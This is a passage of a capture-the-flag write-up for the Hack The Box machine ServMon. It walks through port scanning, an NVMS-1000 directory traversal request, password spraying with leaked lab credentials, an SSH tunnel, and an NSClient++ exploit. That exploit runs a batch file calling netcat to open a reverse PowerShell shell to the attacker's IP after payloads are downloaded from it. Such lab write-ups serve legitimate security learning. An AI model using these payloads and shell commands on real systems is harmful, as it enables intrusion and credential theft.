-</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">404</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">18</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Document not found
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">302</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Location: /index.html
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_    refox/68.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: NSClient++
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was /index.html
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
-</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-01-14T13:24:20
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2021-01-13T13:24:20
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
-</span></span><span class="line"><span class="cl"><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
-</span></span><span class="line"><span class="cl">SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>4/12%Time<span class="o">=</span>5E93410A%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NULL
-</span></span><span class="line"><span class="cl">SF:,6B,<span class="s2">&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
-</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
-</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,1B4,<span class="s2">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
-</span></span></span><span class="line"><span class="cl"><span class="s2">SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
-</span></span></span><span class="line"><span class="cl"><span class="s2">....
-</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</span></span></span><span class="line"><span class="cl"><span class="s2">
-</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
-</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: -28s
-</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
-</span></span></span><span class="line"><span class="cl"><span class="s2">|   2.02: 
-</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
-</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
-</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2020-04-12T16:27:15
-</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
-</span></span></span></code></pre></div><p>RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box. Besides these standard ports, there are some interesting services installed on the box:</p>
-<ul>
-<li>FTP with anonymous login on port 21,</li>
-<li>SSH service on port 22</li>
-<li>HTTPS service on non-standard port 8443.</li>
-</ul>
-<p>This machine probably is not an Active Directory.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span><span class="line"><span class="cl">21/tcp   open  ftp           Microsoft ftpd
-</span></span><span class="line"><span class="cl">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-</span></span><span class="line"><span class="cl">|_01-18-20  12:05PM       &lt;DIR&gt;          Users
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><p>Based on <code>nmap</code> scans, the FTP root directory contains the <code>Users</code> folder. Inside the <code>Users</code> folder, I found two subfolders, one is <code>Nathan</code> and the other is <code>Nadine</code>. Both of these users&rsquo; folders contain a text file, I copied these files to my machine.</p>
-<p>The first file is <code>Confidential.txt</code>. It contains a note from <code>Nadine</code> to <code>Nathan</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Nathan,
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Regards
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Nadine
-</span></span></code></pre></div><p>The second file is <code>Notes to do.txt</code>. It contains a to do list.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1) Change the password for NVMS - Complete
-</span></span><span class="line"><span class="cl">2) Lock down the NSClient Access - Complete
-</span></span><span class="line"><span class="cl">3) Upload the passwords
-</span></span><span class="line"><span class="cl">4) Remove public access to NVMS
-</span></span><span class="line"><span class="cl">5) Place the secret files in SharePoint
-</span></span></code></pre></div><p>I&rsquo;ll note that there&rsquo;s a <code>Password.txt</code> text on <code>Nathan</code>&rsquo;s desktop and the uncompleted to do.</p>
-<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
-<p>Anonymous login is not allowed, so nothing to see here.</p>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Visiting port 80 redirects me to a login page on <code>Pages/login.htm</code></p>
-<p><div class="img-container"><img src="imgs/image-20210406234719034.png" alt="image-20210406234719034"  /></div>
-</p>
-<p>Based on Google, NVSMS-1000 is a software for CCTV monitoring. I don&rsquo;t find the default credentials, and it doesn&rsquo;t seem to work with common credentials.</p>
-<h4 id="exploit-db">Exploit-DB</h4>
-<p>A quick search on <code>exploit-db</code> shows it is vulnerable to Directory Traversal.</p>
-<blockquote>
-<p>PoC: <a href="https://www.exploit-db.com/exploits/47774">https://www.exploit-db.com/exploits/47774</a></p>
-</blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># Title: NVMS-1000 - Directory Traversal
-</span></span><span class="line"><span class="cl"># Date: 2019-12-12
-</span></span><span class="line"><span class="cl"># Author: Numan Türle
-</span></span><span class="line"><span class="cl"># Vendor Homepage: http://en.tvt.net.cn/
-</span></span><span class="line"><span class="cl"># Version : N/A
-</span></span><span class="line"><span class="cl"># Software Link : http://en.tvt.net.cn/products/188.html
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">POC
-</span></span><span class="line"><span class="cl">---------
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: 12.0.0.1
-</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
-</span></span><span class="line"><span class="cl">Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
-</span></span><span class="line"><span class="cl">Connection: close
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Response
-</span></span><span class="line"><span class="cl">---------
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">; for 16-bit app support
-</span></span><span class="line"><span class="cl">[fonts]
-</span></span><span class="line"><span class="cl">[extensions]
-</span></span><span class="line"><span class="cl">[mci extensions]
-</span></span><span class="line"><span class="cl">[files]
-</span></span><span class="line"><span class="cl">[Mail]
-</span></span><span class="line"><span class="cl">MAPI=1
-</span></span></code></pre></div><p>There&rsquo;s no version is specified, but I&rsquo;ll give it a try.</p>
-<h3 id="tcp-8443---nsclient">TCP 8443 - NSClient++</h3>
-<h4 id="exploit-db-1">Exploit-DB</h4>
-<p><div class="img-container"><img src="imgs/image-20210407052822638.png" alt="image-20210407052822638"  /></div>
-</p>
-<p>It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding &rsquo;exploit&rsquo; to the keyword pops up an exploit link that refers to exploit-DB:</p>
-<ul>
-<li>Manual PoC: <a href="https://www.exploit-db.com/exploits/46802">https://www.exploit-db.com/exploits/46802</a></li>
-<li>Scripted PoC: <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
-</ul>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-nadine">Shell as nadine</h3>
-<blockquote>
-<p>I&rsquo;ve added <code>htb.servmon</code>  to my <code>/etc/hosts</code>, so it will resolve to <code>10.10.10.184</code>. I know <code>htb.servmon</code> looks weird, but that&rsquo;s me in the past hehe..</p>
-</blockquote>
-<h4 id="nvms-1000-directory-traversal---obtain-passwordstxt">NVMS-1000 Directory Traversal - Obtain Passwords.txt</h4>
-<p>I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000</p>
-<p><div class="img-container"><img src="imgs/image-20210406234225362.png" alt="image-20210406234225362"  /></div>
-</p>
-<p>It returns a list of passwords</p>
-<p><div class="img-container"><img src="imgs/image-20210406234232390.png" alt="image-20210406234232390"  /></div>
-</p>
-<h4 id="password-spraying">Password spraying</h4>
-<p>I created a usernames list and a password list:</p>
-<ul>
-<li>
-<p><code>users.txt</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">nathan
-</span></span><span class="line"><span class="cl">nadine
-</span></span></code></pre></div></li>
-<li>
-<p><code>passwords.txt</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1nsp3ctTh3Way2Mars!
-</span></span><span class="line"><span class="cl">Th3r34r3To0M4nyTrait0r5!
-</span></span><span class="line"><span class="cl">B3WithM30r4ga1n5tMe
-</span></span><span class="line"><span class="cl">L1k3B1gBut7s@W0rk
-</span></span><span class="line"><span class="cl">0nly7h3y0unGWi11F0l10w
-</span></span><span class="line"><span class="cl">IfH3s4b0Utg0t0H1sH0me
-</span></span><span class="line"><span class="cl">Gr4etN3w5w17hMySk1Pa5$
-</span></span></code></pre></div></li>
-</ul>
-<p>With these, a password spray can be performed using <code>CrackMapExec</code>. It hits on <code>nadine:L1k3B1gBut7s@W0rk</code> pair.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ crackmapexec smb htb.servmon -u users -p passwords
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span><span class="line"><span class="cl">SMB         10.10.10.184    <span class="m">445</span>    SERVMON          <span class="o">[</span>+<span class="o">]</span> SERVMON<span class="se">\n</span>adine:L1k3B1gBut7s@W0rk 
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><h4 id="ssh-access">SSH access</h4>
-<p>The credentials also work on SSH.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ ssh nadine@htb.servmon
-</span></span></code></pre></div><center>
-<p><div class="img-container"><img src="imgs/image-20210407055115129.png" alt="image-20210407055115129"  /></div>
-</p>
-</center>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-system">Shell as SYSTEM</h3>
-<h4 id="obtain-nsclient-password">Obtain NSClient++ password</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">3) Upload the passwords
-</span></span><span class="line"><span class="cl">4) Remove public access to NVMS
-</span></span><span class="line"><span class="cl">5) Place the secret files in SharePoint
-</span></span></code></pre></div><p>Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\&gt;</span> gc <span class="s1">&#39;Program Files\NSClient++\nsclient.ini&#39;</span>
-</span></span></code></pre></div><center>
-<p><div class="img-container"><img src="imgs/image-20210407055600651.png" alt="image-20210407055600651"  /></div>
-</p>
-</center>
-<p>I&rsquo;ll try the <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">scripted PoC</a>. But before that, I&rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can&rsquo;t perform exploit directly from outside.</p>
-<h4 id="ssh-tunneling">SSH Tunneling</h4>
-<p>SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I&rsquo;ll create another SSH connection for tunneling.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 
-</span></span></code></pre></div><p><code>-L 8443:127.0.0.1:8443</code> means it will forward any connection on my localhost port 8443 to remote localhost  on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.</p>
-<h4 id="nsclient-exploit-poc">NSClient++ Exploit PoC</h4>
-<p>First, I&rsquo;ll create a batch, called <code>sans.bat</code> file on my machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">@echo off
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">C:\Temp\nc.exe 10.10.14.23 443 -e powershell.exe
-</span></span></code></pre></div><p>Once it created, I&rsquo;ll transfer the file to ServMon on <code>C:\temp\</code> via python http server along with <code>netcat</code> for windows.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ Python -m SimpleHTTPServer <span class="m">80</span>
-</span></span></code></pre></div><p>Get the hosted files on ServMon</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\&gt;</span> Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat
-</span></span><span class="line"><span class="cl">PS C:<span class="se">\&gt;</span> Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe
-</span></span></code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ nc -nlvvp <span class="m">443</span>
-</span></span></code></pre></div><p>Then I can just run the exploit and wait on my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ python3 nsRCE.py -t 127.0.0.1 -P <span class="m">8443</span> -p <span class="s1">&#39;ew2x6SsGTxjRwXOT&#39;</span> -c <span class="s2">&#34;c:\temp\reverse.bat&#34;</span>
-</span></span></code></pre></div><p>Now I have an interactive shell as NT Authority\SYSTEM.</p>
-<p><div class="img-container"><img src="imgs/image-20210407063703741.png" alt="image-20210407063703741"  /></div>
-</p>
 ]]></content:encoded>
     </item>
     
